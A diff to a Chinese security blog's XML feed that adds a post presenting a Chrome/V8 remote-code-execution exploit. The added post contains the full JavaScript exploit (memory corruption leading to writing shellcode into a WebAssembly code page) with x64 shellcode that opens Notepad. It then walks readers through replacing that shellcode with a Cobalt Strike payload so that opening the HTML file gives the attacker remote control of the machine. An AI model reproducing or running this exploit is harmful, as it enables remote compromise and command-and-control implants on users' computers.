@@ -4,6 +4,33 @@
   
     
     <entry>
+      <title>谷歌(Chrome)0day上线cs</title>
+      <link href="2021/04/16/%E8%B0%B7%E6%AD%8C-Chrome-0day%E4%B8%8A%E7%BA%BFcs/"/>
+      <url>2021/04/16/%E8%B0%B7%E6%AD%8C-Chrome-0day%E4%B8%8A%E7%BA%BFcs/</url>
+      
+        <content type="html"><![CDATA[<h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>谷歌浏览器是大家最常用的浏览器之一，尤其是从事安全行业的，谷歌可以说是必备的浏览器了。 但最近谷歌爆出了个0day，可以通过此漏洞RCE，本文就给大家介绍谷歌怎么上线cs</p><blockquote><p>大家请勿担心，rce的前提是谷歌必须开启–no-sandbox无沙盒模式，但是大家默认安装的谷歌是有沙盒的。这也是这个漏洞比较鸡肋的地方，否则还不到处是钓鱼文件</p></blockquote><h2 id="弹记事本的Poc"><a href="#弹记事本的Poc" class="headerlink" title="弹记事本的Poc"></a>弹记事本的Poc</h2><p>执行命令执行需要先开启无沙盒模式，找到自己的谷歌浏览器-&gt;属性-&gt;快捷方式</p><p>目标中添加–no-sandbox</p><p><img src="/2021/04/16/%E8%B0%B7%E6%AD%8C-Chrome-0day%E4%B8%8A%E7%BA%BFcs/image-20210416162008247.png" alt="image-20210416162008247"></p><p>新建一个文件命名为xxx.html，然后将代码导入其中，双击打开即可</p><pre class="line-numbers language-<script>" data-language="<script>"><code class="language-<script>">    function gc() &#123;        for (var i &#x3D; 0; i &lt; 0x80000; ++i) &#123;            var a &#x3D; new ArrayBuffer();        &#125;    &#125;    let shellcode &#x3D; [0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51,        0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52, 0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52,        0x20, 0x48, 0x8B, 0x72, 0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,        0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0xE2, 0xED,        0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B, 0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88,        0x00, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,        0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41, 0x8B, 0x34, 0x88, 0x48,        0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0, 0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1,        0x38, 0xE0, 0x75, 0xF1, 0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,        0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44, 0x8B, 0x40, 0x1C, 0x49,        0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01, 0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A,        0x41, 0x58, 0x41, 0x59, 0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,        0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48, 0xBA, 0x01, 0x00, 0x00,        0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D, 0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B,        0x6F, 0x87, 0xFF, 0xD5, 0xBB, 0xF0, 0xB5, 0xA2, 0x56, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,        0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0, 0x75, 0x05, 0xBB, 0x47,        0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89, 0xDA, 0xFF, 0xD5, 0x6E, 0x6F, 0x74, 0x65, 0x70,        0x61, 0x64, 0x2E, 0x65, 0x78, 0x65, 0x00];    var wasmCode &#x3D; new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 133, 128, 128, 128, 0, 1, 96, 0, 1, 127, 3, 130, 128, 128, 128, 0, 1, 0, 4, 132, 128, 128, 128, 0, 1, 112, 0, 0, 5, 131, 128, 128, 128, 0, 1, 0, 1, 6, 129, 128, 128, 128, 0, 0, 7, 145, 128, 128, 128, 0, 2, 6, 109, 101, 109, 111, 114, 121, 2, 0, 4, 109, 97, 105, 110, 0, 0, 10, 138, 128, 128, 128, 0, 1, 132, 128, 128, 128, 0, 0, 65, 42, 11]);    var wasmModule &#x3D; new WebAssembly.Module(wasmCode);    var wasmInstance &#x3D; new WebAssembly.Instance(wasmModule);    var main &#x3D; wasmInstance.exports.main;    var bf &#x3D; new ArrayBuffer(8);    var bfView &#x3D; new DataView(bf);    function fLow(f) &#123;        bfView.setFloat64(0, f, true);        return (bfView.getUint32(0, true));    &#125;    function fHi(f) &#123;        bfView.setFloat64(0, f, true);        return (bfView.getUint32(4, true))    &#125;    function i2f(low, hi) &#123;        bfView.setUint32(0, low, true);        bfView.setUint32(4, hi, true);        return bfView.getFloat64(0, true);    &#125;    function f2big(f) &#123;        bfView.setFloat64(0, f, true);        return bfView.getBigUint64(0, true);    &#125;    function big2f(b) &#123;        bfView.setBigUint64(0, b, true);        return bfView.getFloat64(0, true);    &#125;    class LeakArrayBuffer extends ArrayBuffer &#123;        constructor(size) &#123;            super(size);            this.slot &#x3D; 0xb33f;        &#125;    &#125;    function foo(a) &#123;        let x &#x3D; -1;        if (a) x &#x3D; 0xFFFFFFFF;        var arr &#x3D; new Array(Math.sign(0 - Math.max(0, x, -1)));        arr.shift();        let local_arr &#x3D; Array(2);        local_arr[0] &#x3D; 5.1;&#x2F;&#x2F;4014666666666666        let buff &#x3D; new LeakArrayBuffer(0x1000);&#x2F;&#x2F;byteLength idx&#x3D;8        arr[0] &#x3D; 0x1122;        return [arr, local_arr, buff];    &#125;    for (var i &#x3D; 0; i &lt; 0x10000; ++i)        foo(false);    gc(); gc();    [corrput_arr, rwarr, corrupt_buff] &#x3D; foo(true);    corrput_arr[12] &#x3D; 0x22444;    delete corrput_arr;    function setbackingStore(hi, low) &#123;        rwarr[4] &#x3D; i2f(fLow(rwarr[4]), hi);        rwarr[5] &#x3D; i2f(low, fHi(rwarr[5]));    &#125;    function leakObjLow(o) &#123;        corrupt_buff.slot &#x3D; o;        return (fLow(rwarr[9]) - 1);    &#125;    let corrupt_view &#x3D; new DataView(corrupt_buff);    let corrupt_buffer_ptr_low &#x3D; leakObjLow(corrupt_buff);    let idx0Addr &#x3D; corrupt_buffer_ptr_low - 0x10;    let baseAddr &#x3D; (corrupt_buffer_ptr_low &amp; 0xffff0000) - ((corrupt_buffer_ptr_low &amp; 0xffff0000) % 0x40000) + 0x40000;    let delta &#x3D; baseAddr + 0x1c - idx0Addr;    if ((delta % 8) &#x3D;&#x3D; 0) &#123;        let baseIdx &#x3D; delta &#x2F; 8;        this.base &#x3D; fLow(rwarr[baseIdx]);    &#125; else &#123;        let baseIdx &#x3D; ((delta - (delta % 8)) &#x2F; 8);        this.base &#x3D; fHi(rwarr[baseIdx]);    &#125;    let wasmInsAddr &#x3D; leakObjLow(wasmInstance);    setbackingStore(wasmInsAddr, this.base);    let code_entry &#x3D; corrupt_view.getFloat64(13 * 8, true);    setbackingStore(fLow(code_entry), fHi(code_entry));    for (let i &#x3D; 0; i &lt; shellcode.length; i++) &#123;        corrupt_view.setUint8(i, shellcode[i]);    &#125;    main();&lt;&#x2F;script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如下图，双击打开后成功弹出记事本</p><p><img src="/2021/04/16/%E8%B0%B7%E6%AD%8C-Chrome-0day%E4%B8%8A%E7%BA%BFcs/image-20210416162155094.png" alt="image-20210416162155094"></p><h2 id="上线cs"><a href="#上线cs" class="headerlink" title="上线cs"></a>上线cs</h2><p>新建一个监听器，如下图</p><p><img src="/2021/04/16/%E8%B0%B7%E6%AD%8C-Chrome-0day%E4%B8%8A%E7%BA%BFcs/image-20210416162256857.png" alt="image-20210416162256857"></p><p>生成一个C语言的payload，需要勾选x64</p><p><img src="/2021/04/16/%E8%B0%B7%E6%AD%8C-Chrome-0day%E4%B8%8A%E7%BA%BFcs/image-20210416162334952.png" alt="image-20210416162334952"></p><p>打开如下图，现在需要对里面的数据进行下处理，开启替换模式把\替换为,0</p><p><img src="/2021/04/16/%E8%B0%B7%E6%AD%8C-Chrome-0day%E4%B8%8A%E7%BA%BFcs/image-20210416162440995.png" alt="image-20210416162440995"></p><p>替换后</p><p><img src="/2021/04/16/%E8%B0%B7%E6%AD%8C-Chrome-0day%E4%B8%8A%E7%BA%BFcs/image-20210416162554410.png" alt="image-20210416162554410"></p><p>将0xfc,0x48……替换到咱们原先弹记事本的shellcode中</p><p><img src="/2021/04/16/%E8%B0%B7%E6%AD%8C-Chrome-0day%E4%B8%8A%E7%BA%BFcs/image-20210416162701060.png" alt="image-20210416162701060"></p><p>然后同样在浏览器里面打开，成功上线！</p><p><img src="/2021/04/16/%E8%B0%B7%E6%AD%8C-Chrome-0day%E4%B8%8A%E7%BA%BFcs/image-20210416163010372.png" alt="image-20210416163010372"></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 内网渗透 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 内网渗透 </tag>
+            
+            <tag> Web安全 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>ATT&amp;CK 红日靶场实战演习心得笔记(一)</title>
       <link href="2021/04/15/ATT-CK-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%E6%BC%94%E4%B9%A0%E5%BF%83%E5%BE%97%E7%AC%94%E8%AE%B0-%E4%B8%80/"/>
       <url>2021/04/15/ATT-CK-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%E6%BC%94%E4%B9%A0%E5%BF%83%E5%BE%97%E7%AC%94%E8%AE%B0-%E4%B8%80/</url>
@@ -21,6 +48,8 @@
         <tags>
             
             <tag> 内网渗透 </tag>
+            
+            <tag> Web安全 </tag>
             
         </tags>
       
@@ -104,6 +133,8 @@
         <tags>
             
             <tag> 内网渗透 </tag>
+            
+            <tag> Web安全 </tag>
             
             <tag> docker </tag>
             
